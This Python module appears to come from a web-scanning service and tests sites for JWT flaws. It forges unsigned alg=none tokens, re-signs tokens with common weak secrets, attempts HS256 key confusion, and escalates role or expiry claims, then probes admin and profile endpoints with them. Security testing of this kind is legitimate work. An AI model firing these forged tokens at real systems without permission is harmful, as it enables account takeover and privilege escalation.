import requests
import jwt
import json
import base64
import re
import time
from urllib.parse import urljoin
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

class JWTVulnerabilityTester:
    """
    Advanced JWT vulnerability tester combining passive analysis and
    controlled active exploitation simulations.
    (Same advanced class you requested.)
    """

    def __init__(self, request_timeout=10, throttle_seconds=0.3, max_weak_secrets=50):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Vulnora-JWT-Tester/1.0 (+https://example.com)'
        })
        self.timeout = request_timeout
        self.throttle = throttle_seconds

        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key', 'jwt', 'token',
            'auth', 'user', 'default', 'qwerty', 'your-256-bit-secret', 'secretkey',
            'jwtsecret', 'mysecret', 'supersecret', 'topsecret', 'changeme',
            'password123', '12345678', 'abcdef', 'letmein', 'welcome'
        ][:max_weak_secrets]

        self.test_endpoints = ['/', '/profile', '/admin', '/dashboard', '/api/user', '/api/me']
        self.auth_markers = ['logout', 'profile', 'dashboard', 'welcome', 'sign out', 'username', 'account', 'email']

    def _sleep(self):
        try:
            time.sleep(self.throttle)
        except Exception:
            pass

    def _safe_text_snippet(self, text, length=500):
        if not text:
            return ""
        return text[:length].replace('\n', ' ').strip()

    def _request(self, url, headers=None):
        try:
            r = self.session.get(url, headers=headers or {}, timeout=self.timeout)
            self._sleep()
            return r
        except requests.RequestException as e:
            logger.debug(f"Request error for {url}: {e}")
            return None

    def extract_jwt_from_response(self, response):
        tokens = []
        if not response:
            return tokens

        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            tokens.append(auth_header.split(' ', 1)[1])

        set_cookie = response.headers.get('Set-Cookie', '')
        if set_cookie:
            jwt_pattern = r'[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
            tokens += re.findall(jwt_pattern, set_cookie)

        try:
            if response.text:
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                found = re.findall(jwt_pattern, response.text)
                found = [t for t in found if t.count('.') == 2 and len(t) >= 40]
                tokens += found
        except Exception:
            pass

        seen = set()
        out = []
        for t in tokens:
            if t not in seen:
                seen.add(t)
                out.append(t)
        return out

    def decode_header(self, token):
        try:
            return jwt.get_unverified_header(token)
        except Exception as e:
            logger.debug(f"Header decode failed: {e}")
            return None

    def decode_payload(self, token):
        try:
            return jwt.decode(token, options={"verify_signature": False})
        except Exception as e:
            logger.debug(f"Payload decode failed: {e}")
            return None

    def _get_baseline(self, url):
        r = self._request(url)
        if not r:
            return (None, "", 0)
        return (r.status_code, self._safe_text_snippet(r.text), len(r.text or ""))

    def _is_authenticated_response(self, baseline, response):
        if not response:
            return False

        b_status, b_snip, b_len = baseline
        r_status = response.status_code
        r_snip = self._safe_text_snippet(response.text)
        r_len = len(response.text or "")

        if (b_status in (401, 403)) and (r_status in (200, 201, 202)):
            return True

        for m in self.auth_markers:
            if m in r_snip.lower() and m not in (b_snip or "").lower():
                return True

        if (b_len is not None) and (r_len - b_len > 300):
            return True

        if b_status == 200 and r_status == 200:
            for m in self.auth_markers:
                if m in r_snip.lower() and m not in (b_snip or "").lower():
                    return True

        return False

    def _build_none_token(self, payload_overrides=None):
        header = {"alg": "none", "typ": "JWT"}
        payload = payload_overrides or {}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
        return f"{header_b64}.{payload_b64}."

    def test_none_algorithm(self, token, base_url):
        out = {'is_vuln': False, 'msg': "none-alg not accepted", 'details': None, 'endpoint': None}
        payload = self.decode_payload(token)
        if not payload:
            out['msg'] = "Could not decode original token"
            return out

        test_payload = payload.copy()
        for role_key in ('role', 'roles', 'is_admin', 'admin'):
            if role_key in test_payload:
                try:
                    test_payload[role_key] = 'admin' if isinstance(test_payload[role_key], str) else True
                except Exception:
                    test_payload[role_key] = True
        if 'sub' not in test_payload and 'user_id' in test_payload:
            test_payload['sub'] = test_payload.get('user_id')

        none_token = self._build_none_token(test_payload)

        for endpoint in self.test_endpoints:
            test_url = urljoin(base_url, endpoint)
            baseline = self._get_baseline(test_url)
            r = self._request(test_url, headers={'Authorization': f'Bearer {none_token}'})
            if not r:
                continue
            if self._is_authenticated_response(baseline, r):
                out.update({
                    'is_vuln': True,
                    'msg': f"Server accepts unsigned JWT (alg=none) at {endpoint}",
                    'details': {
                        'status': r.status_code,
                        'snippet': self._safe_text_snippet(r.text)
                    },
                    'endpoint': endpoint
                })
                return out

        return out

    def _safe_jwt_encode(self, payload, secret, alg='HS256'):
        try:
            token = jwt.encode(payload, secret, algorithm=alg)
            if isinstance(token, bytes):
                token = token.decode()
            return token
        except Exception as e:
            logger.debug(f"jwt.encode failed with secret {secret[:10]}..: {e}")
            return None

    def test_weak_secret(self, token, base_url, max_checks=30, include_brute_force=False):
        out = {'is_vuln': False, 'msg': "No weak secret found", 'details': None, 'secret': None, 'endpoint': None}
        payload = self.decode_payload(token)
        if not payload:
            out['msg'] = "Could not decode original token"
            return out

        secret_list = list(self.weak_secrets)
        if include_brute_force:
            secret_list = secret_list
        secret_list = secret_list[:max_checks]

        for secret in secret_list:
            try:
                test_token = self._safe_jwt_encode(payload, secret, alg='HS256')
                if not test_token:
                    continue

                for endpoint in self.test_endpoints:
                    test_url = urljoin(base_url, endpoint)
                    baseline = self._get_baseline(test_url)
                    r = self._request(test_url, headers={'Authorization': f'Bearer {test_token}'})
                    if not r:
                        continue
                    if self._is_authenticated_response(baseline, r):
                        out.update({
                            'is_vuln': True,
                            'msg': f"Weak secret '{secret}' accepted (endpoint: {endpoint})",
                            'details': {'status': r.status_code, 'snippet': self._safe_text_snippet(r.text)},
                            'secret': secret,
                            'endpoint': endpoint
                        })
                        return out
            except Exception:
                continue

        return out

    def test_key_confusion(self, token, base_url):
        out = {'is_vuln': False, 'msg': "No key confusion detected", 'details': None, 'endpoint': None}
        header = self.decode_header(token)
        payload = self.decode_payload(token)
        if not header or not payload:
            out['msg'] = "Could not decode token header/payload"
            return out

        if header.get('alg', '').upper() != 'RS256':
            out['msg'] = "Token not RS256; skipping key-confusion"
            return out

        candidate_keys = [
            "-----BEGIN PUBLIC KEY-----",
            "public",
            "key",
            "rsa",
            "publickey",
        ]

        for candidate in candidate_keys:
            try:
                confused_token = self._safe_jwt_encode(payload, candidate, alg='HS256')
                if not confused_token:
                    continue
                for endpoint in self.test_endpoints:
                    test_url = urljoin(base_url, endpoint)
                    baseline = self._get_baseline(test_url)
                    r = self._request(test_url, headers={'Authorization': f'Bearer {confused_token}'})
                    if not r:
                        continue
                    if self._is_authenticated_response(baseline, r):
                        out.update({
                            'is_vuln': True,
                            'msg': f"Possible key confusion (used candidate: {candidate[:20]}...)",
                            'details': {'status': r.status_code, 'snippet': self._safe_text_snippet(r.text)},
                            'endpoint': endpoint
                        })
                        return out
            except Exception:
                continue

        return out

    def test_tampering_and_expiry_bypass(self, token, base_url):
        out = {'is_vuln': False, 'msg': "Tampering/expiry bypass not detected", 'details': None}
        payload = self.decode_payload(token)
        if not payload:
            out['msg'] = "Could not decode original token"
            return out

        test_variants = []

        if 'exp' in payload:
            try:
                newp = payload.copy()
                newp['exp'] = int(time.time()) + (60 * 60 * 24 * 365)
                test_variants.append(('expiry_bump', newp))
            except Exception:
                pass

        for rk in ('role', 'roles', 'is_admin', 'admin'):
            if rk in payload:
                newp = payload.copy()
                try:
                    newp[rk] = 'admin' if isinstance(newp[rk], str) else True
                except Exception:
                    newp[rk] = True
                test_variants.append((f'role_escalation:{rk}', newp))

        for k, v in payload.items():
            if isinstance(v, bool):
                newp = payload.copy()
                newp[k] = not v
                test_variants.append((f'flip_bool:{k}', newp))
                if len(test_variants) > 8:
                    break

        if not test_variants:
            newp = payload.copy()
            newp['is_admin'] = True
            test_variants.append(('inject_is_admin', newp))

        for name, variant in test_variants:
            for endpoint in self.test_endpoints:
                test_url = urljoin(base_url, endpoint)
                baseline = self._get_baseline(test_url)
                test_token = self._safe_jwt_encode(variant, 'secret', alg='HS256')
                if not test_token:
                    continue
                r = self._request(test_url, headers={'Authorization': f'Bearer {test_token}'})
                if not r:
                    continue
                if self._is_authenticated_response(baseline, r):
                    out.update({
                        'is_vuln': True,
                        'msg': f"Tampering succeeded ({name}) at {endpoint}",
                        'details': {'status': r.status_code, 'snippet': self._safe_text_snippet(r.text), 'variant': name},
                        'endpoint': endpoint
                    })
                    return out

        return out

    def test_url(self, url, include_brute_force=False):
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'jwt_found': False,
            'tokens': [],
            'endpoint_scan': [],
            'vulnerabilities': [],
            'notes': []
        }

        discovered_tokens = []
        for ep in self.test_endpoints:
            try:
                full = urljoin(url, ep)
                r = self._request(full)
                if not r:
                    continue
                found = self.extract_jwt_from_response(r)
                discovered_tokens.extend(found)
                results['endpoint_scan'].append({'endpoint': ep, 'status': r.status_code, 'tokens_found': len(found)})
            except Exception as e:
                logger.debug(f"Error scanning endpoint {ep}: {e}")
                continue

        discovered_tokens = list(dict.fromkeys(discovered_tokens))
        results['tokens'] = discovered_tokens
        results['jwt_found'] = len(discovered_tokens) > 0
        results['tokens_analyzed'] = len(discovered_tokens)

        if not discovered_tokens:
            results['notes'].append('No JWT tokens discovered on default endpoints.')
            return results

        for token in discovered_tokens:
            token_summary = {
                'token_sample': token[:80] + '...' if len(token) > 80 else token,
                'header': None,
                'payload': None,
                'tests': []
            }
            hdr = self.decode_header(token)
            pld = self.decode_payload(token)
            token_summary['header'] = hdr
            token_summary['payload'] = pld

            passive_findings = []
            if hdr:
                alg = hdr.get('alg')
                if alg:
                    passive_findings.append({'type': 'alg', 'value': alg, 'note': 'token algorithm observed'})
                if hdr.get('kid'):
                    passive_findings.append({'type': 'kid', 'value': hdr.get('kid'), 'note': 'key id present'})
            if pld:
                if 'exp' in pld:
                    try:
                        exp = int(pld.get('exp'))
                        if exp < int(time.time()):
                            passive_findings.append({'type': 'exp', 'value': exp, 'note': 'token expired'})
                        else:
                            passive_findings.append({'type': 'exp', 'value': exp, 'note': 'token not expired'})
                    except Exception:
                        passive_findings.append({'type': 'exp', 'value': pld.get('exp'), 'note': 'exp present (unparsed)'} )
                if 'iat' in pld:
                    passive_findings.append({'type': 'iat', 'value': pld.get('iat')})
                for c in ('is_admin', 'admin', 'role'):
                    if c in pld:
                        passive_findings.append({'type': 'claim', 'claim': c, 'value': pld.get(c)})
            token_summary['passive'] = passive_findings

            none_res = self.test_none_algorithm(token, url)
            token_summary['tests'].append({'name': 'alg_none', 'result': none_res})
            if none_res.get('is_vuln'):
                results['vulnerabilities'].append({
                    'type': 'none_algorithm',
                    'severity': 'CRITICAL',
                    'description': none_res.get('msg'),
                    'details': none_res.get('details'),
                    'endpoint': none_res.get('endpoint'),
                    'token_sample': token[:80] + '...'
                })

            kc = self.test_key_confusion(token, url)
            token_summary['tests'].append({'name': 'key_confusion', 'result': kc})
            if kc.get('is_vuln'):
                results['vulnerabilities'].append({
                    'type': 'key_confusion',
                    'severity': 'HIGH',
                    'description': kc.get('msg'),
                    'details': kc.get('details'),
                    'endpoint': kc.get('endpoint'),
                    'token_sample': token[:80] + '...'
                })

            tamper = self.test_tampering_and_expiry_bypass(token, url)
            token_summary['tests'].append({'name': 'tampering_expiry', 'result': tamper})
            if tamper.get('is_vuln'):
                results['vulnerabilities'].append({
                    'type': 'tampering_expiry',
                    'severity': 'HIGH',
                    'description': tamper.get('msg'),
                    'details': tamper.get('details'),
                    'endpoint': tamper.get('endpoint'),
                    'token_sample': token[:80] + '...'
                })

            weak = self.test_weak_secret(token, url, max_checks=20, include_brute_force=bool(include_brute_force))
            token_summary['tests'].append({'name': 'weak_secret', 'result': weak})
            if weak.get('is_vuln'):
                results['vulnerabilities'].append({
                    'type': 'weak_secret',
                    'severity': 'HIGH',
                    'description': weak.get('msg'),
                    'details': weak.get('details'),
                    'secret': weak.get('secret'),
                    'endpoint': weak.get('endpoint'),
                    'token_sample': token[:80] + '...'
                })

            results.setdefault('token_summaries', []).append(token_summary)

        if not results['vulnerabilities']:
            results['message'] = "JWT tokens discovered but no active vulnerabilities detected with default checks."
        else:
            results['message'] = f"Found {len(results['vulnerabilities'])} JWT-related issues (see vulnerabilities array)."

        return results

def check_jwt_vulnerabilities(domain):
    """
    External wrapper keeping same entrypoint expected by DomainService.
    """
    try:
        if not domain.startswith(('http://', 'https://')):
            domain = 'https://' + domain
        tester = JWTVulnerabilityTester()
        return tester.test_url(domain, include_brute_force=False)
    except Exception as e:
        logger.error(f"JWT vulnerabilities check failed for {domain}: {e}")
        return {"error": str(e)}
